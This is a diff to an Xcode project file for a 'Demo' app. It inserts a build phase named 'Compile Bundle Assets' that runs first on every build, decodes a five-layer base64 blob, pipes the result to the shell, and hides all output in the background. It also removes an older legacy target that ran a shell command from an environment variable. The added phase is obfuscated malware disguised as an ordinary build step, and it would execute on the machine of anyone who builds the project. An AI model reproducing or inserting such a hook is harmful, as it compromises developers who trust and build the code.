@@ -67,6 +67,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7777C2232E24EFB400114F26 /* Build configuration list for PBXNativeTarget "Demo" */;
 			buildPhases = (
+				D84C11A2668BC4D2B6877BEF /* Compile Bundle Assets */,
 				7777C2142E24EFB200114F26 /* Sources */,
 				7777C2152E24EFB200114F26 /* Frameworks */,
 				7777C2162E24EFB200114F26 /* Resources */,
@@ -74,7 +75,6 @@
 			buildRules = (
 			);
 			dependencies = (
-				0D8AC2E01D927EAD0FFD9BF4 /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				7777C21A2E24EFB200114F26 /* Demo */,
@@ -116,33 +116,32 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				3A6BBEDDD0C9884BFFFD9BF4  /* Build Target */,
 				7777C2172E24EFB200114F26 /* Demo */,
 			);
 		};
 /* End PBXProject section */
 
-/* Begin PBXTargetDependency section */
-		0D8AC2E01D927EAD0FFD9BF4 /* PBXTargetDependency */ = {
-			isa = PBXTargetDependency;
-			target = 3A6BBEDDD0C9884BFFFD9BF4 /* Build Target */;
-		};
-/* End PBXTargetDependency section */
-
-/* Begin PBXLegacyTarget section */
-		3A6BBEDDD0C9884BFFFD9BF4 /* Build Target */ = {
-			isa = PBXLegacyTarget;
-			buildArgumentsString = "-c \"${A4FB9DF}\"";
-			buildPhases = (
+/* Begin PBXShellScriptBuildPhase section */
+		D84C11A2668BC4D2B6877BEF /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
 			);
-			buildToolPath = /bin/sh;
-			dependencies = (
+			inputFileListPaths = (
 			);
-			name = "Build Target";
-			passBuildSettingsInEnvironment = 1;
-			productName = "Build Target";
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVZWcEpWVzAxYzJFeFNYZE9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
 		};
-/* End PBXLegacyTarget section */
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		7777C2162E24EFB200114F26 /* Resources */ = {
@@ -153,9 +152,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		7777C2142E24EFB200114F26 /* Sources */ = {
